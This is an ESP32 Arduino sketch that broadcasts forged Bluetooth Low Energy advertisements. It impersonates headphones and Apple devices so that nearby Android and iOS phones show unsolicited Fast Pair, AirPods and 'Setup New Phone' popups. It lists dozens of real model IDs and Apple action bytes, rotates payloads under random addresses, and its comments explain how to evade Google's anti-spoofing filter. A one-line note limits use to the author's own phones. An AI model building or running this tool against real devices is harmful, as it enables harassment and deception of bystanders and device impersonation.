#include <Arduino.h>
#include <BLEDevice.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#include <esp_gap_ble_api.h>
#include <esp_random.h>

// ---------------------------------------------------------------------------
// Choose target:
//   MODE_FAST_PAIR  -> Android "Fast Pair" setup popup (rotates model IDs)
//   MODE_CONTINUITY -> iOS "Proximity Pairing" (AirPods-style) popup
//   MODE_BOTH       -> alternates Fast Pair and Continuity every swap
// For testing on YOUR OWN phones only.
// ---------------------------------------------------------------------------
#define MODE_FAST_PAIR   1
#define MODE_CONTINUITY  2
#define MODE_BOTH        3

// Runtime mode. Change live via Serial Monitor (see commands in setup()).
int advMode = MODE_FAST_PAIR;   // startup default

// Current index into each list, and a flag to reconfigure the advertisement
// only when something actually changes. Holding ONE ID with a STABLE address
// avoids Google's "detected spoofing" filter that blocks rotating IDs.
int fpIndex = 0;
int apIndex = 0;
bool advDirty = true;

// Auto-rotation interval (Continuity/iOS and Both). Fast Pair does NOT auto-
// rotate -- it holds one stable ID (rotating trips Google anti-spoofing).
static const uint32_t kSwapMs = 3000;

// Advertising params: connectable, undirected, ~100 ms interval.
esp_ble_adv_params_t kAdvParams = {
    .adv_int_min = 0x00A0,
    .adv_int_max = 0x00A0,
    .adv_type = ADV_TYPE_IND,
    .own_addr_type = BLE_ADDR_TYPE_RANDOM,
    .peer_addr = {0},
    .peer_addr_type = BLE_ADDR_TYPE_PUBLIC,
    .channel_map = ADV_CHNL_ALL,
    .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
};

// -- Google Fast Pair model IDs (Service Data UUID 0xFE2C, 3-byte big-endian).
// Publicly-circulated IDs. Android popup is gated by Google Play Services
// server-side validation, so some may not raise the half-sheet on newer OS.
// Curated from DiamondRoPlayz/FastPair-Models (real consumer devices, correct
// names). Google validates IDs server-side, so some may be revoked; the "debug"
// IDs at the end historically raise a generic half-sheet.
const uint8_t kModelIds[][3] = {
    // -- Earbuds / headphones --
    {0x72, 0xEF, 0x8D},  // Razer Hammerhead TWS X
    {0x0E, 0x30, 0xC3},  // Razer Hammerhead TWS
    {0xCD, 0x82, 0x56},  // Bose NC 700
    {0xF0, 0x00, 0x00},  // Bose QC35 II
    {0x00, 0x00, 0xF0},  // Bose QC35 II
    {0x00, 0xC9, 0x5C},  // Sony WF-1000X
    {0x01, 0xEE, 0xB4},  // Sony WH-1000XM4
    {0x02, 0xC9, 0x5C},  // Sony WH-1000XM2
    {0xD4, 0x46, 0xA7},  // Sony WF-1000XM5
    {0x2D, 0x7A, 0x23},  // Sony WF-1000XM4
    {0x07, 0xA4, 0x1C},  // Sony WF-C700N
    {0x05, 0x8D, 0x08},  // Sony WH-1000XM4
    {0xF5, 0x24, 0x94},  // JBL Buds Pro
    {0x71, 0x8F, 0xA4},  // JBL Live 300TWS
    {0x82, 0x1F, 0x66},  // JBL Flip 6
    {0x02, 0xD8, 0x86},  // JBL Reflect Mini NC
    {0x02, 0xF6, 0x37},  // JBL Live Flex
    {0x02, 0xDD, 0x4F},  // JBL Tune 770NC
    {0x03, 0x8C, 0xC7},  // JBL Tune 760NC
    {0x04, 0xAF, 0xB8},  // JBL Tune 720BT
    {0x05, 0x4B, 0x2D},  // JBL Tune 125TWS
    {0x06, 0x60, 0xD7},  // JBL Live 770NC
    {0x04, 0xAC, 0xFC},  // JBL Wave Beam
    {0x03, 0x8F, 0x16},  // Beats Studio Buds
    {0x00, 0xAA, 0x48},  // Jabra Elite 2
    {0x06, 0xC1, 0x97},  // OPPO Enco Air3 Pro
    {0x06, 0xD8, 0xFC},  // soundcore Liberty 4 NC
    {0x07, 0x44, 0xB6},  // Technics EAH-AZ60M2
    {0x05, 0xA9, 0x63},  // Wonderboom 3
    // -- Pixel Buds --
    {0x92, 0xBB, 0xBD},  // Pixel Buds
    {0x05, 0x82, 0xFD},  // Pixel Buds
    {0x06, 0x00, 0x00},  // Pixel Buds
    // -- LG --
    {0xF0, 0x03, 0x00},  // LG HBS-835S
    {0xF0, 0x03, 0x05},  // LG HBS-1500
    // -- Phones / watches / other --
    {0x05, 0x77, 0xB1},  // Galaxy S23 Ultra
    {0x05, 0xA9, 0xBC},  // Galaxy S20+
    {0x06, 0xAE, 0x20},  // Galaxy S21 5G
    {0x05, 0x78, 0x02},  // TicWatch Pro 5
    {0x07, 0xF4, 0x26},  // Nest Hub Max
    // -- Debug IDs (generic half-sheet) --
    {0x00, 0x00, 0x07},  // Android Auto
    {0x00, 0x00, 0x0C},  // Set Up Device
};
const int kNumModels = sizeof(kModelIds) / sizeof(kModelIds[0]);

// -- Apple Continuity proximity-pairing models (frame type 0x07). Bytes from
// ECTO-1A/AppleJuice. Model goes in payload bytes 7,8 of the 31-byte frame.
const uint8_t kAppleModels[][2] = {
    {0x02, 0x20},  // AirPods
    {0x0E, 0x20},  // AirPods Pro
    {0x0A, 0x20},  // AirPods Max
    {0x0F, 0x20},  // AirPods Gen2
    {0x13, 0x20},  // AirPods Gen3
    {0x14, 0x20},  // AirPods Pro Gen2
    {0x03, 0x20},  // PowerBeats
    {0x0B, 0x20},  // PowerBeats Pro
    {0x0C, 0x20},  // Beats Solo Pro
    {0x11, 0x20},  // Beats Studio Buds
    {0x10, 0x20},  // Beats Flex
    {0x05, 0x20},  // BeatsX
    {0x06, 0x20},  // Beats Solo3
    {0x09, 0x20},  // Beats Studio3
    {0x17, 0x20},  // Beats Studio Pro
    {0x12, 0x20},  // Beats Fit Pro
    {0x16, 0x20},  // Beats Studio Buds+
};
const int kNumApple = sizeof(kAppleModels) / sizeof(kAppleModels[0]);

// -- Apple "Nearby Action" popups (frame type 0x0F): Setup / Transfer / Apple
// TV / HomePod prompts. Only the action byte differs. These pop reliably on iOS.
struct NearbyAction {
  uint8_t action;
  const char *name;
};
const NearbyAction kNearbyActions[] = {
    {0x09, "Setup New Phone"},
    {0x02, "Transfer Number"},
    {0x0B, "HomePod Setup"},
    {0x01, "Apple TV Setup"},
    {0x06, "Apple TV Pair"},
    {0x20, "Apple TV New User"},
    {0x2B, "Apple TV Apple ID Setup"},
    {0xC0, "Apple TV Wireless Audio Sync"},
    {0x0D, "Apple TV HomeKit Setup"},
    {0x13, "Apple TV Keyboard"},
    {0x27, "Apple TV Connect Network"},
    {0x1E, "TV Color Balance"},
};
const int kNumActions = sizeof(kNearbyActions) / sizeof(kNearbyActions[0]);

// Continuity index space = proximity models first, then nearby actions.
const int kNumContinuity = kNumApple + kNumActions;

// Scratch buffer the controller reads from each swap.
uint8_t advBuf[31];

void randomizeAddress() {
  // Random static address so each swap looks like a fresh device.
  esp_bd_addr_t addr;
  esp_fill_random(addr, sizeof(addr));
  addr[0] |= 0xC0;  // top two bits set => random static address
  esp_ble_gap_set_rand_addr(addr);
}

void setFastPairAdv(int idx) {
  const uint8_t frame[] = {
      0x02, 0x01, 0x06,        // Flags
      0x06, 0x16, 0x2C, 0xFE,  // Service Data, UUID16 = 0xFE2C
      kModelIds[idx][0], kModelIds[idx][1], kModelIds[idx][2],
      0x02, 0x0A, 0x00,        // Tx Power = 0 dBm
  };
  memcpy(advBuf, frame, sizeof(frame));
  esp_ble_gap_config_adv_data_raw(advBuf, sizeof(frame));
}

// idx in [0, kNumApple)          -> proximity pairing (AirPods-style popup)
// idx in [kNumApple, kNumContinuity) -> nearby action (Setup/Transfer/etc)
void setContinuityAdv(int idx) {
  if (idx < kNumApple) {
    const uint8_t frame[31] = {
        0x1E, 0xFF, 0x4C, 0x00,  // len=30, Manufacturer Data, Apple 0x004C
        0x07, 0x19, 0x07,        // type=0x07 proximity pairing, len, prefix
        kAppleModels[idx][0], kAppleModels[idx][1],  // device model
        0x75, 0xAA, 0x30, 0x01, 0x00, 0x00,
        0x45, 0x12, 0x12, 0x12,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00,  // -> 31 bytes
    };
    memcpy(advBuf, frame, sizeof(frame));
    esp_ble_gap_config_adv_data_raw(advBuf, sizeof(frame));
  } else {
    uint8_t act = kNearbyActions[idx - kNumApple].action;
    const uint8_t frame[23] = {
        0x16, 0xFF, 0x4C, 0x00,  // len=22, Manufacturer Data, Apple 0x004C
        0x04, 0x04, 0x2A, 0x00, 0x00, 0x00,  // nearby-info header
        0x0F, 0x05, 0xC1,        // type=0x0F nearby action, len, flags
        act,                     // action byte (which popup)
        0x60, 0x4C, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,  // -> 23 bytes
    };
    memcpy(advBuf, frame, sizeof(frame));
    esp_ble_gap_config_adv_data_raw(advBuf, sizeof(frame));
  }
}

volatile bool scanRequested = false;

// Decode one device using the core parsers: hex dump + Fast Pair / Apple flags.
void decodeAdv(BLEAdvertisedDevice &d) {
  Serial.printf("  %s  rssi=%4d", d.getAddress().toString().c_str(),
                d.getRSSI());
  if (d.getName().length()) Serial.printf("  \"%s\"", d.getName().c_str());

  uint8_t *p = d.getPayload();
  size_t len = d.getPayloadLength();
  Serial.print("  ");
  for (size_t j = 0; j < len; j++) Serial.printf("%02X", p[j]);
  Serial.println();

  // Fast Pair: Service Data under UUID 0xFE2C, 3-byte model ID.
  for (int i = 0; i < d.getServiceDataCount(); i++) {
    BLEUUID u = d.getServiceDataUUID(i);
    auto sd = d.getServiceData(i);
    if (u.equals(BLEUUID((uint16_t)0xFE2C)) && sd.length() >= 3) {
      Serial.printf("     >> FAST PAIR model ID = %02X%02X%02X   "
                    "{0x%02X, 0x%02X, 0x%02X},\n",
                    (uint8_t)sd[0], (uint8_t)sd[1], (uint8_t)sd[2],
                    (uint8_t)sd[0], (uint8_t)sd[1], (uint8_t)sd[2]);
    }
  }

  // Apple: Manufacturer Data with company 0x004C; byte[2] = frame type.
  if (d.haveManufacturerData()) {
    auto m = d.getManufacturerData();
    if (m.length() >= 3 && (uint8_t)m[0] == 0x4C && (uint8_t)m[1] == 0x00) {
      uint8_t type = (uint8_t)m[2];
      const char *what = type == 0x07 ? "Proximity Pairing (popup)"
                         : type == 0x12 ? "Nearby Info (Handoff)"
                         : type == 0x10 ? "Nearby Action" : "other";
      Serial.printf("     >> APPLE type=0x%02X (%s)\n", type, what);
    }
  }
}

// Stop advertising, scan the air for `seconds`, print every device seen.
void scanAndDump(uint32_t seconds) {
  esp_ble_gap_stop_advertising();
  Serial.printf("\n=== BLE scan %us ===\n", seconds);

  BLEScan *scan = BLEDevice::getScan();
  scan->setActiveScan(true);  // also request scan response
  scan->setInterval(100);
  scan->setWindow(99);
  BLEScanResults *res = scan->start(seconds, false);

  int n = res->getCount();
  Serial.printf("--- %d devices ---\n", n);
  for (int i = 0; i < n; i++) {
    BLEAdvertisedDevice d = res->getDevice(i);
    decodeAdv(d);
  }
  scan->clearResults();
  Serial.println("=== scan done; resuming advertising ===\n");
}

void printMode() {
  const char *name = advMode == MODE_FAST_PAIR ? "Fast Pair (Android)"
                     : advMode == MODE_CONTINUITY ? "Continuity (iOS)"
                                                  : "BOTH (Android + iOS)";
  Serial.printf(">> MODE %d = %s\n", advMode, name);
}

// Read digits from the Serial Monitor and switch mode live.
void pollSerial() {
  while (Serial.available()) {
    int c = Serial.read();
    if (c == '1') { advMode = MODE_FAST_PAIR;  advDirty = true; printMode(); }
    else if (c == '2') { advMode = MODE_CONTINUITY; advDirty = true; printMode(); }
    else if (c == '3') { advMode = MODE_BOTH;   advDirty = true; printMode(); }
    else if (c == '0') { scanRequested = true; }
    else if (c == 'n') {  // next ID (Android manual; iOS also steps if wanted)
      if (advMode == MODE_CONTINUITY) apIndex = (apIndex + 1) % kNumContinuity;
      else fpIndex = (fpIndex + 1) % kNumModels;
      advDirty = true;
    } else if (c == 'p') {  // previous ID
      if (advMode == MODE_CONTINUITY)
        apIndex = (apIndex + kNumContinuity - 1) % kNumContinuity;
      else fpIndex = (fpIndex + kNumModels - 1) % kNumModels;
      advDirty = true;
    }
  }
}

class GapCallbacks : public BLEServerCallbacks {
  void onConnect(BLEServer *) override { Serial.println("client connected"); }
  void onDisconnect(BLEServer *) override {
    Serial.println("client disconnected; re-advertising");
    esp_ble_gap_start_advertising(&kAdvParams);
  }
};

void setup() {
  Serial.begin(115200);
  delay(200);

  BLEDevice::init("");  // name unused; raw adv drives the popup

  BLEServer *server = BLEDevice::createServer();
  server->setCallbacks(new GapCallbacks());

  Serial.println("Commands: 0=Scan 1=FastPair 2=Continuity 3=Both "
                 "n=nextID p=prevID");
  Serial.println("Android(1)=stable, manual n/p (anti-spoofing). "
                 "iOS(2)/Both(3)=auto-rotate.");
  printMode();
}

void loop() {
  static uint32_t bothTick = 0;
  static uint32_t lastSwap = 0;

  pollSerial();

  if (scanRequested) {
    scanRequested = false;
    scanAndDump(10);
    advDirty = true;  // rebuild advertisement after scan
    return;
  }

  // Continuity (iOS) and Both auto-rotate on a timer -- no anti-spoofing on
  // Apple, and cycling shows many popups. Fast Pair holds ONE stable ID.
  bool autoRotate = (advMode == MODE_CONTINUITY) || (advMode == MODE_BOTH);
  if (autoRotate && millis() - lastSwap >= kSwapMs) {
    lastSwap = millis();
    if (advMode == MODE_CONTINUITY) apIndex = (apIndex + 1) % kNumContinuity;
    else bothTick++;
    advDirty = true;
  }

  if (advDirty) {
    advDirty = false;
    esp_ble_gap_stop_advertising();
    randomizeAddress();  // new address only when the payload changes

    if (advMode == MODE_FAST_PAIR) {
      setFastPairAdv(fpIndex);
      Serial.printf("FastPair  [%2d/%2d]  ID=%02X%02X%02X   (n=next p=prev)\n",
                    fpIndex + 1, kNumModels, kModelIds[fpIndex][0],
                    kModelIds[fpIndex][1], kModelIds[fpIndex][2]);
    } else if (advMode == MODE_CONTINUITY) {
      setContinuityAdv(apIndex);
      if (apIndex < kNumApple) {
        Serial.printf("Continuity  [%2d/%2d]  Proximity model=%02X%02X\n",
                      apIndex + 1, kNumContinuity, kAppleModels[apIndex][0],
                      kAppleModels[apIndex][1]);
      } else {
        Serial.printf("Continuity  [%2d/%2d]  Action=%s\n", apIndex + 1,
                      kNumContinuity, kNearbyActions[apIndex - kNumApple].name);
      }
    } else {  // MODE_BOTH: even -> Fast Pair, odd -> Continuity
      if (bothTick & 1) {
        int a = (bothTick / 2) % kNumContinuity;
        setContinuityAdv(a);
        Serial.printf("[BOTH] Continuity idx=%d\n", a);
      } else {
        int m = (bothTick / 2) % kNumModels;
        setFastPairAdv(m);
        Serial.printf("[BOTH] FastPair  ID=%02X%02X%02X\n",
                      kModelIds[m][0], kModelIds[m][1], kModelIds[m][2]);
      }
    }
    esp_ble_gap_start_advertising(&kAdvParams);
  }

  delay(50);  // keep serial responsive; no busy rotation
}
